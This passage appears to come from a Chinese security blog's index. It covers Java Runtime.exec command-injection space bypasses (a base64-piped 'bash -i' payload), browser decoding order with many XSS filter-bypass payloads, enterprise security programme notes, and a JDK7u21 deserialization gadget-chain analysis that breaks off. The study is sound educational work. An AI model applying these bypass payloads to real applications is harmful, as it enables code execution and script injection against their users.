参数，当未指定时,运行如下示例程序,系统会启动一个pid为8984的cmd后台进程，由于cmd进程未终止导致java程序卡死。当指定/c时，cmd进程会在命令执行完毕后成功终止。 所以在Windows环境下，使用Runtime.getRuntime()执行的命令前缀需要加上cmd /c，使得底层Windows的processthreadsapi.h#CreateProcessW()方法在创建新进程时，可以正确识别cmd且成功返回命令执行结果。 String command + base64encode 优势 适用于字符串命令传参 缺点 无 字符串命令传参的情况下可以通过 @jackson 这个国外研究员的方式解决：http://www.jackson-t.ca/runtime-exec-payloads.html Process procdemo = Runtime.getRuntime().exec(&quot;bash -c {echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d}|{bash,-i}&quot;); 下面进行简单的分析 这里可以看到因为没有空格的原因，即使经过 StringTokenizer 处理，依然只分割成了三个参数 最后传入 java.lang.UNIXProcess#forkAndExec 时也是如我们所期望的那样 那么这个payload的构造有什么巧妙？ bash -c {echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d}|{bash,-i} 我们对这个 payload 进行从左至右的分析 首先 bash -c 同我们之前分析所用的 /bin/sh -c 是一样的道理，只不过调用的环境不一样 接着我们分析 {echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d} 其实就是 大括号 + 管道符 的利用，核心目的是为了绕过空格的限制从而避免被 StringTokenizer 处理 接着分析 echo flag &gt; flag.txt|{bash,-i} bash -i 常见用于反弹shell中，其核心是 -i 这个参数表示的是产生交互式的shell 再延伸一下思路： 经过上面的分析其实我们知道核心思路就是一个 bypass 符号的问题 我们的目的也就是用 shell 能识别但是不会被 StringTokenizer 切割的 想想 CTF 中最常见的 bypass 空格的方式 ${IFS} Process procdemo = Runtime.getRuntime().exec(&quot;bash echo${IFS}flag&gt;flag.txt&quot;); 根据最后传参格式来看是可以执行的 但是本地为 MacOS 环境，无法测试最终结果 End在后面调试的 ProcessBuilder#start() 过程中看到了 @李三 师傅的文章：https://xz.aliyun.com/t/7046 以及 @threedr3am 师傅的评论。 写的太细了，本来我已经没有任何补充空间了，但是还是重新写了一遍，我觉得写点东西才能沉淀下来 REF： https://xz.aliyun.com/t/7046 https://www.anquanke.com/post/id/221159 https://mp.weixin.qq.com/s/pzpc44-xH932M4eCJ8LxYg","link":"/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"title":"浏览器解析机制与渲染过程","text":"浏览器编解码与XSS bypass 序章论一张图打败你学 XSS 的信心。（转自微博 附上 MDN DOM 事件参考: https://developer.mozilla.org/zh-CN/docs/Web/Events 本文参考多篇文章，涉及相关晦涩难懂名词解释，术语解释。均是 CTRL c v 。属于只可意会不可言传的领域。其他的知识都会尽量经我口中阐述的简单一点。 浏览器的解码浏览器的解码规则 HTML解析器对HTML文档进行解析完成HTML解码并且创建DOM树 javascript 或者 CSS解析器对内联脚本进行解析，完成JS CSS解码 URL解码会根据URL所在的顺序不同而在JS解码前或者解码后 当浏览器从网络堆栈中获得一段内容后，触发HTML解析器来对这篇文档进行词法解析。在这一步中字符引用被解码。在词法解析完成后，DOM树就被创建好了，JavaScript解析器会介入来对内联脚本进行解析。在这一步中Unicode转义序列和Hex转义序列被解码。同时，如果浏览器遇到需要URL的上下文，URL解析器也会介入来解码URL内容。在这一步中URL解码操作被完成。由于URL位置不同，URL解析器可能会在JavaScript解析器之前或之后进行解析。 Example A: &lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;Example B: &lt;a href=# onclick=&quot;window.open(&apos;UserInput&apos;)&quot;&gt;&lt;/a&gt;Example C: &lt;a href=&quot;javascript:window.open(&apos;UserInput&apos;)&quot;&gt; 在例A中，HTML解析器将首先开始工作，并对UserInput中的字符引用进行解码。然后URL解析器开始对href值进行URL解码。最后，如果URL资源类型是JavaScript，那么JavaScript解析器会进行Unicode转义序列和Hex转义序列的解码。再之后，解码的脚本会被执行。因此，这里涉及三轮解码，顺序是HTML，URL和JavaScript。 在例B中，HTML解析器首先工作。然而接下来，JavaScript解析器开始解析在onclick事件处理器中的值。这是因为在onclick事件处理器中是script的上下文。当这段JavaScript被解析并被执行的时候，它执行的是“window.open()”操作，其中的参数是URL的上下文。在此时，URL解析器开始对UserInput进行URL解码并把结果回传给JavaScript引擎。因此这里一共涉及三轮解码，顺序是HTML，JavaScript和URL。 例C与例A很像，但不同的是在UserInput前多了window.open()操作。因此，对UserInput多了一次额外的URL解码操作。总的来说，四轮解码操作被完成，顺序是HTML，URL，JavaScript和URL。 HTML 解析概括 HTML 中五类元素。详细可直接参考HTML5 语法https://www.w3.org/html/ig/zh/wiki/HTML5/syntax 空元素: 空一字体现在不能容纳内容。一般的标签由 &lt;start&gt;content&lt;/end&gt;这样组成。空元素意味着没有闭合标签的标签。如: &lt;area&gt;,&lt;br&gt;,&lt;base&gt; 原始文本元素: 可以容纳内容。 &lt;script&gt;和&lt;style&gt;。 RCDATA元素，可以容纳文本和字符引用。&lt;textarea&gt;和&lt;title&gt; 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释: 如 MathML命名空间或者SVG命名空间的元素 基本元素，可以容纳文本、字符引用、其他元素和注释: 除了以上4种元素以外的元素 上面的内容我提炼了较为陌生的专业术语 字符引用 RCDATA 外部元素 什么是字符引用？字符引用包括“字符值引用”和“字符实体引用”。如在HTML中，&lt;对应的字符值引用为&amp;#60;，对应的字符实体引用为&amp;lt;。字符实体引用也被叫做“实体引用”或“实体”——》再次延伸概念: 字符实体字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开始，后面跟着一个预定义的实体的名称，或是一个#符号以及字符的十进制数字。——》产生问题: 为啥我要用字符实体呢，要经过转义这么麻烦的操作 ——〉HTML字符实体在HTML中，某些字符是预留的。例如在HTML中不能使用“&lt;”或“&gt;”，这是因为浏览器可能误认为它们是标签的开始或结束。如果希望正确地显示预留字符，就需要在HTML中使用对应的字符实体。 外部元素容纳种类的比空元素、原始文本元素多，有什么用呢？Foreign elements ——》 SVG黑魔法&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 这个payload能执行的原因是因为 &lt;svg&gt; 遵循XML和SVG的定义。在XML中，&amp;#40;会被解析成 （。同理 &lt;svg&gt;&lt;script&gt;alert&amp;#x28;1);&lt;/script&gt; 也可以造成 XSStips: 在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 下面开始进入HTML解析过程… 一个HTML解析器作为一个状态机，HTML解析器有很多种状态。进行状态转换的方式是从输入流中获取字符并按照转换规则转换。以 &lt;start&gt;content&lt;/end&gt; 为例子。HTML识别开始和结束标签的核心是 / 符号。当HTML解析器遇到 &lt; 且没有 / 。就会进入 标签开始状态 然后转变到 标签名状态， 前属性名状态 … 最后进入 数据状态。 并释放当前标签的token。当解析器处于数据状态时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 容纳字符实体的作用: 在这些状态中HTML字符实体将会从 &amp;#...形式解码。三种情况可以容纳字符实体： 数据状态中的字符引用，RCDATA状态中的字符引用和属性值状态中的字符引用。 有一种可以容纳字符引用的情况是 RCDATA状态中的字符引用。这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被HTML解析器解码。且在解析这些字符引用的过程中不会进入 标签开始状态 。对RCDATA有个特殊的情况。在浏览器解析RCDATA元素的过程中，解析器会进入 RCDATA状态。在这个状态中，如果遇到&lt;字符，它会转换到RCDATA小于号状态。如果&lt;字符后没有紧跟着/和对应的标签名，解析器会转换回RCDATA状态。这意味着在RCDATA元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是&lt;/textarea&gt;或者&lt;/title&gt;。当然，这要看开始标签是哪一个。因此，在&lt;textarea&gt;和&lt;title&gt;的内容中不会创建标签，不会有脚本执行。 URL 解析URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。例如，你不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型。 JavaScript 解析Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。javascript解码器无法试别编码后的控制字符，比如：单引号，双引号和圆括号，之后会用一些例子进行详细说明。 Python 转码脚本自己最近在写一个XSS的扫描脚本，其中一个模块具有判断 XSS payload 的有效性的功能。这里给出部分转码片段 import htmlimport refrom urllib.parse import unquotepayload = &apos;&apos;def decodeHTML(): dh = html.unescape() return dhdef decodeURL(): du = unquote() return dudef decodeUnicode(payload): duni = payload.encode(&apos;utf-8&apos;).decode(&apos;unicode_escape&apos;) return duni 从payload看解析流程1、&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;不弹窗， 原因: 识别到 href ，属性值状态中的字符引用。进入url模块解析。URL规定协议，用户名，密码都必须是ASCII。且不能对协议类型进行任何的编码操作。这里的 javascript 协议无法识别。 2、&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; 弹窗， 原因: 属性值状态中的字符引用。识别到实体化编码内容，进入html解码得到 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;。然后进入 URL 解析。此时可正确识别协议类型。解码得到&lt;a href=&quot;javascript:alert(2)&quot;&gt; 最后 JavaScript 解析。 3、&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt; 不弹窗， 原因同一， 这里 javascript: 为协议，任何一部分内容都不能编码 4、&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;不弹窗， 原因: 属性值状态中的字符引用，先进行 HTML 解析。但 HTML 解析机制中&amp;#60;会被 HTML 解码，但不会进入标签开始状态，当然也就不会创建 img 元素。(HTML编码就是为了显示这些特殊字符，而不干扰正常的DOM解析) 5、&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;不弹窗， 原因为: &lt;textarea&gt;是RCDATA元素，可以容纳文本和字符引用，注意不能容纳其他元素，HTML解码得到&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;但 &lt;textarea&gt;只容纳文本和字符引用。因此js无法执行 6、&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;不弹窗， 原因同5 7、&lt;button onclick=&quot;confirm(&apos;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;弹窗， 原因: 属性值状态中的字符引用，先进行HTML解码。然后JS执行 8、&lt;button onclick=&quot;confirm(&apos;8\\u0027);&quot;&gt;Button&lt;/button&gt;不弹窗， 原因: 在JavaScript中，标识符只能包含字母或数字或下划线（“_”）或美元符号（“$”），且不能以数字开头。 onclick中的值会交给JS处理，在JS中只有字符串和标识符能用Unicode表示，&apos;显然不行，JS执行失败。 9、&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;不弹窗， 原因: script标签属于原始文本元素。无法容纳字符引用，所以无法进行HTML解码。因此JS解析时并不能执行弹窗 10、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;弹窗， 原因: 直接进入 JavaScript 解析。且发现unicode编码，其为 alert 标识符进行编码后的字符串。所以能先解码，然后执行 11、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;不弹窗， 原因同8: 出现括号进行了unicode编码，JS无法识别编码后的控制字符 12、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;不弹窗， 其实个人最开始看到payload是感觉能弹窗的，后来参考了别人的思路。发现\\u0031\\u0032在解码的时候会被解码为字符串12。需要引号包裹。因此不执行JS 13、&lt;script&gt;alert(&apos;13\\u0027)&lt;/script&gt;不弹窗，原因同8: 出现单引号进行了unicode编码，JS无法识别编码后的控制字符 14、&lt;script&gt;alert(&apos;14\\u000a&apos;)&lt;/script&gt;弹窗。原因: \\u000a在JavaScript里是换行，就是\\n，直接执行 组合拳:&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt; 先进行HTML解码得&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)&quot;&gt;&lt;/a&gt;然后进入 URL 模块处理，发现完整 javascript: 协议，进行URL解码。得javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(15)控制字符 ()未被unicode编码，因此进行 JavaScript 解码，成功弹窗 浏览器渲染浏览器的呈现引擎呈现引擎默认可以解析html文档、xml文档以及图片等资源并将解析后的内容展示给用户。通过各种插件（浏览器扩展程序）浏览器还可以展示其他各类型的web资源，如pdf插件可以让浏览器展示pdf文档。不同浏览器使用的呈现引擎也不一样，目前主流的呈现引擎有Webkit、Blink(Webkit的一个分支)、Gecko、Trident、EdgeHTML(Trident的一个分支)。 浏览器 呈现引擎 Chrome Blink（Chrome 28+） Webkit（Chrome 27-） Safari Webkit Firefox Gecko Edge EdgeHTML IE Trident 页面呈现原理当我们点击一个链接，服务器将 HTML 代码传输到我们的浏览器，浏览器在接收到这份 HTML 代码之后进行的页面的呈现，粗略的说会经过以下这些步骤： DOM 树的构建（Parse HTML） 构建 CSSOM 树（Recaculate Style） 合并 DOM 树与 CSSOM 树为 Render 树 布局（Layout） 绘制（Paint） 复合图层化（Composite） 页面呈现过程中的阻塞 当遇到 JavaScript 脚本或者外部 JavaScript 代码时，浏览器便停止 DOM 的构建（阻塞 1） 当遇到 &lt;script&gt; 标签需要执行脚本代码时，浏览器会检查是否这个 &lt;script&gt; 标签以上的 CSS 文件是否已经加载并用于构建了 CSSOM，如果 &lt;script&gt; 上部还有 CSS 样式没加载，则浏览器会等待 &lt;script&gt; 上方样式的加载完成才会执行该 &lt;script&gt; 内的脚本（阻塞 2） DOM 树与 CSSOM 树的成功构建是后面步骤的根基（同步阻塞） 同时外部脚本、外部样式表的下载也是耗费时间较多的点 Webkit和Gecko的流程对比Webkit的主要流程（图片摘自Tali Garsiel的研究成果) Gecko的主要流程（图片摘自Tali Garsiel的研究成果） 参考链接从浏览器渲染与解码原理重新认识xss浏览器解码看XSS深入理解浏览器解析机制和XSS向量编码浏览器的工作原理：新式网络浏览器幕后揭秘浏览器内核、JS 引擎、页面呈现原理及其优化从Chrome源码看浏览器如何构建DOM树不同内核浏览器的差异以及浏览器渲染简介","link":"/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/"},{"title":"甲方安全建设的思路学习和思考","text":"对甲方安全建设的知识学习以及对未来职业规划的思考 Preface最近一次偶然的面试被问到了甲方安全，和面试官交流学到了很多思维上面的东西。 面对这从未涉足过的方面，我希望能先从互联网上的文章借鉴一些体系化流程建设的思路，学习一些方法论 当然在学习甲方安全建设的过程中我经常会引发一些对未来的思考 以下几篇文章给我带来的触动颇多： 在腾讯的八年，我的职业思考：https://yuguo.us/weblog/tencent-8-years/ 安全从业人员的职业规划：https://mp.weixin.qq.com/s/134C13nbVtJkg-MM0eRe8g 其中一张图更是引发了我平淡的学习生活中对未来规划的一个思考 此外，和面试官聊了一些关于甲乙方对安全的看法等等，我惭愧的发现自己一直忽略了漏洞的防止和修复这一个关键的点上。每次都只知道个大概，而真正的业务上的修复却不知道如何着手。我决定从现在开始改掉这个坏习惯。 安全建设步骤下文步骤转自 @pirogue 师傅文章：甲方安全建设步骤 资产梳理 IP列表、业务分组(负责人、联系方向)、业务属性 业务端口 业务应用架构、技术堆栈 边界安全，防火墙策略控制（需要梳理业务端口） 如果是硬件，使用防火墙统一控制 如果是操作系统，Iptalbes＋IPSEC 及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略) 跳板机安全控制 账户安全管理 弱密码 root、sudoer权限 账户、授权、访问、审计等等 服务器安全 安全基线检测 操作审计 异常登录审计(日志收集分析) 漏洞清点/扫描，补丁修复测试和推进 WEB安全 应用渗透测试 接口安全(加密、通信) webshell实时监测 Nginx日志分析/Nginx流量旁路分析 业务风控安全 用户安全机制（密码、验证码、登录） 交易安全 安全培训 安全意识培训 运维安全培训 WEB安全开发 安全规范和流程 人员入职账户开通 人员离职账户注销 服务器上下架安全管理 安全应急响应机制 内网安全 内网服务器安全 账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统) 弱口令监测(NTLM/LM) 账户异常登录 网络隔离（物理／虚拟化） 网络准入 PC安全（病毒统一管理、通知处理） 关于一些思路这篇文章从多个维度讲解了安全建设的思考，个人感觉写的非常不错：https://www.secrss.com/articles/26532 一、安全与业务的关系 二、互联网企业安全建设整体思路 三、互联网企业面临安全风险与影响 四、互联网企业核心安全目标 五、互联网企业核心安全能力建设 六、互联网企业安全蓝图 七、互联网企业安全整体视角 八、如何落地实施 九、分阶段安全体系建设 十、做好安全建设的必要条件 十一、如何衡量安全建设的效果 十二、安全漏洞管理平台建设实践 十三、写在最后 另一篇着重谈体系化思考的文章也非常不错：企业安全建设的体系思考与落地实践： https://www.secrss.com/articles/11299 关键点就是对知识的学习、提炼、总结、分类，然后根据当前环境分析，最后解决问题 SDL微软安全开发生命周期（Security Development Lifecycle）简称 SDL SDL 过程图 更多参看： [1]【软件安全设计】安全开发生命周期（SDL） http://blog.nsfocus.net/sdl/[2] 微软SDL官方地址http://www.microsoft.com/security/sdl/default.aspx[3] Microsoft SDL 的简化实施https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=12379[4] SDL 威胁建模工具入门https://msdn.microsoft.com/zh-cn/magazine/dd347831.aspx 此外这篇文章 https://xz.aliyun.com/t/6625 在介绍 SDL 的时候花了很大的篇幅在讲 SonarQube 相关的安装和配置，没有接触过 SonarQube 。先留个坑。 DevSecOps根据网上大多数文章，我发现现在很多大企业都在推进 DevSecOps SDL与DevSecOps有各自的适用场景，对软件安全开发的发展都有着重要的贡献。 DevSecOps越来越受到周期短、迭代快的互联网业务的欢迎，也成为安全界的流行趋势 什么是 DevSecOps ？？ DevSecOps一词最早由Gartner在2012年提出，并从2017年开始逐渐成为热门词汇。DevSecOps可以理解为将安全性融入到DevOps的过程中，在整个开发和运维的过程中将安全作为一项重要的考虑因素，最终实现应用整个生命周期内的安全性。利用DevSecOps实现安全自动化可以在提高研发运维效率的同时增强应用的安全性。 关于 SDL 和 DevSecOps 的对比可以看这篇文章：https://www.secrss.com/articles/28407 业内首次对该模型及配套解决方案进行详细的分析，核心理念为：安全是整个IT团队（包括开发、测试、运维及安全团队）所有成员的责任，需要贯穿整个业务生命周期的每一个环节。每个人都对安全负责，安全工作前置，柔和嵌入现有开发流程体系。 详细一点的我引入 携程DevSecOps实践 一文的图 这一图大概的能理清楚每一个缓解的事项 更详细的可以参考云鼎实验室的图 以下三个例子分别是不同企业在建设 DevSecOps 的思路分享 OPPO互联网DevSecOps实践：https://www.secrss.com/articles/25053 DevSecOps在携程的最佳实践：https://www.secrss.com/articles/23728 DevSecOps在腾讯云的落地实践：https://www.secrss.com/articles/19426 DevSecOps的安全工具金字塔: https://www.secrss.com/articles/28514 安全测试的自动化工具链的建设可能是落地的一个重要环节 DAST 安全扫描自动化检测平台建设（Web黑盒上）：https://sec.xiaomi.com/article/9 安全扫描自动化检测平台建设（Web黑盒中）：https://sec.xiaomi.com/article/10 安全扫描自动化检测平台建设（Web黑盒下）：https://sec.xiaomi.com/article/11 爱奇艺分布式漏洞扫描系统：https://www.secrss.com/articles/12049 SASTSAST 之前需要了解代码审计 这一篇文章写的非常好：https://www.secrss.com/articles/13724 同时里面附加了商业工具的一个评测 思考和小结结合现状考虑，作为一个在校生，综合多个因素，在不接触企业中体系化的甲方建设流程情况下，我觉得可以着手的方面如下（其中参杂部分乙方视角） 当然它仅仅只是从 DevSecOps 流程中抽出来的几个板块，并不能代表整个安全流程建设，针对找工作而言，上面的内容应该是对甲乙方安全都有帮助的。","link":"/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/"},{"title":"深入 Java 原生反序列化 & JDK7u21 利用链分析","text":"本篇梳理了 Java 原生反序列化相关知识，同时分析了 JDK 7u21利用链 Serialization and Deserialization参考网上文章梳理了一些序列化和反序列化的细节 Java 序列化将一个对象转换为二进制，反序列化将一个二进制恢复成对象 首先看一下序列化之后到底有什么内容被写入了二进制数据 public class SerializationDemo implements Serializable { private String stringField; private int intField; public SerializationDemo(String s, int i) { this.stringField = s; this.intField = i; } public static void main(String[] args) throws IOException { ObjectOutputStream oops = new ObjectOutputStream(new FileOutputStream(&quot;./serializable.ser&quot;)); oops.writeObject(new SerializationDemo(&quot;Min&quot;, new Random().nextInt(20))); }} SerializationDumper STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 51 - 0x00 33 Value - com.p2hm1n.deserialization.basics.SerializationDemo - 0x636f6d2e7032686d316e2e646573657269616c697a6174696f6e2e6261736963732e53657269616c697a6174696f6e44656d6f serialVersionUID - 0xf1 6f 46 2a 38 38 6b 46 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 2 - 0x00 02 Fields 0: Int - I - 0x49 fieldName Length - 8 - 0x00 08 Value - intField - 0x696e744669656c64 1: Object - L - 0x4c fieldName Length - 11 - 0x00 0b Value - stringField - 0x737472696e674669656c64 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata com.p2hm1n.deserialization.basics.SerializationDemo values intField (int)10 - 0x00 00 00 0a stringField (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 3 - 0x00 03 Value - Min - 0x4d696e 0xaced，魔术头 0x0005，版本号 （JDK主流版本一致，下文如无特殊标注，都以JDK8u为例） 0x73，对象类型标识 （0x7n基本上都定义了类型标识符常量，但也要看出现的位置，毕竟它们都在可见字符的范围，详见java.io.ObjectStreamConstants） 0x72，类描述符标识 0x0033...，类名字符串长度和值 （Java序列化中的UTF8格式标准） 0xf16f462a38386b46，序列版本唯一标识 （serialVersionUID，简称SUID） 0x02，对象的序列化属性标志位，如是否是Block Data模式、自定义writeObject()，Serializable、Externalizable或Enum类型等 0x0002，类的字段个数 0x49，整数类型签名的第一个字节，同理，之后的0x4c为字符串类型签名的第一个字节 （类型签名表示与JVM规范中的定义相同） 0x0008...，字段名字符串长度和值，非原始数据类型的字段还会在后面加上数据类型标识、完整类型签名长度和值 0x78 Block Data结束标识 0x70 父类描述符标识，此处为null 0x0000000a 整数字段intField的值 （Java序列化中的整数格式标准） ，非原始数据类型的字段则会按对象的方式处理，如之后的字符串字段stringField被识别为字符串类型，输出字符串类型标识、字符串长度和值 序列化的执行流程 ObjectOutputStream实例初始化时，将魔术头和版本号写入bout （BlockDataOutputStream类型） 中 调用 ObjectOutputStream.writeObject()开始写对象数据 ObjectStreamClass.lookup()封装待序列化的类描述 （返回ObjectStreamClass类型） ，获取包括类名、自定义serialVersionUID、可序列化字段 （返回ObjectStreamField类型） 和构造方法，以及writeObject、readObject方法等 writeOrdinaryObject()写入对象数据 写入对象类型标识 writeClassDesc()进入分支writeNonProxyDesc()写入类描述数据 写入类描述符标识 写入类名 写入SUID （当SUID为空时，会进行计算并赋值，细节见下面关于SerialVersionUID章节） 计算并写入序列化属性标志位 写入字段信息数据 写入Block Data结束标识 写入父类描述数据 writeSerialData()写入对象的序列化数据 若类自定义了writeObject()，则调用该方法写对象，否则调用defaultWriteFields()写入对象的字段数据 （若是非原始类型，则递归处理子对象） 反序列化的执行流程 ObjectInputStream实例初始化时，读取魔术头和版本号进行校验 调用ObjectInputStream.readObject()开始读对象数据 读取对象类型标识 readOrdinaryObject()读取数据对象 readClassDesc()读取类描述数据 读取类描述符标识，进入分支readNonProxyDesc() 读取类名 读取SUID 读取并分解序列化属性标志位 读取字段信息数据 resolveClass()根据类名获取待反序列化的类的Class对象，如果获取失&gt; 败，则抛出ClassNotFoundException skipCustomData()循环读取字节直到Block Data结束标识为止 读取父类描述数据 initNonProxy()中判断对象与本地对象的SUID和类名 （不含包名） 是否相同，若不同，则抛出InvalidClassException ObjectStreamClass.newInstance()获取并调用离对象最近的非Serializable的父类的无参构造方法 （若不存在，则返回null） 创建对象实例 readSerialData()读取对象的序列化数据 若类自定义了readObject()，则调用该方法读对象，否则调用defaultReadFields()读取并填充对象的字段数据 补充一个细节是在进行反序列化的过程中这里进行了判断 如果满足 hasReadObjectMethod 的条件，会调用 invokeReadObject 引用 @l1nk3r 师傅的总结 是否重写了 readObject 影响的是 slotDesc.hasReadObjectMethod() 的结果 如果反序列化的过程中被反序列化类重写了 readObject ，该数据在反序列化的过程中核心流程走到 readSerialData 方法中的 slotDesc.invokeReadObject 方法，通过反射机制触发相关流程，并且调用重写的 readObject 。如果没有重写 readObject ，则调用 ObjectInputStream 类中的 readObject 方法，并且执行反序列化 同时补一张流程图 更为详细的流程分析可以看以下文章： Java反序列化过程深究 Java原生序列化与反序列化代码简要分析 浅析Java序列化和反序列化 JDK 7u21 Gadget ChainBasics大致几点可以看一下 @天融信阿尔法实验室 这个脑图 CC 中我们也用到了通过 javassist 构造 Static Initializers，回顾我们之前构造调用 TemplatesImpl#newTransformer 结合 javassist 实现的一个 RCE 的 demo，当时的思路是用 IvokerTransformer#transform 去触发 TemplatesImpl#newTransformer 来达到 RCE 回看 TemplatesImpl 其他方法，其实调用了 TemplatesImpl#newTransformer 的也能 RCE，比如我们这里 TemplatesImpl#getOutputProperties 由此我们实现第一个 RCE demo Level-0 demo public class CommandDemo { public static void main(String[] args) throws Exception { // javassist fake Code templates.getOutputProperties(); } 另一个需要关注的点是 hashCode 的一个小 trick，f5a5a608 的 hashCode 值为 0 Gadget chain看一下 javax.xml.transform.Templates ，里面有两个方法都是我们想调用的，意味着只要能循环打印这个 interface 的方法，并在某个类调用这个方法，我们即可 RCE 再结合同样在 CC 中用过的 AnnotationInvocationHandler 和动态代理，我们可以实现第二个 RCE demo Level-1 demo public class CommandDemo { public static void main(String[] args) throws Exception { // javassist fake Code // proxy fake Code proxy.equals(templates); } 从正向思维来看，先谈一下为什么要用 equals 来触发 核心原因是动态代理触发 AnnotationInvocationHandler#invoke是这些 if 判断和参数附值。可以看出来 var4 需要等于 equals，也就是我们需要调用这个方法才行，后面的 this.equalsImpl(var3[0]); 是一个关键方法，此时 var3[0] 是我们 POC 中的 equals传入的参数，也就是 templates AnnotationInvocationHandler#equalsImpl 这里会循环遍历 javax.xml.transform.Templates 中的方法，被我们传入的 templates 调用 后续寻找调用链要找到可以传入一个 proxy，同时调用 equals 方法，而且还能传入参数的地方 这里看一下 LinkedHashSet，其继承自 HashSet ，因为我们要找到满足调用链的方法，LinkedHashSet 是有序的所以这里使用它，构造方法直接调用自父类 其实现序列化和反序列化的逻辑也都存在在父类中，我们之前在 CC 中分析过 HashSet 其反序列化时会恢复键值对，并调用 HashMap 的 put 方法，将其放入 HashMap 中 HashMap#put 是我们调用的关键地方 public V put(K key, V value) { // 判断 key 是否为null if (key == null) return putForNullKey(value); // 计算 key 的 hash int hash = hash(key); int i = indexFor(hash, table.length); for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash &amp;&amp; ((k = e.key) 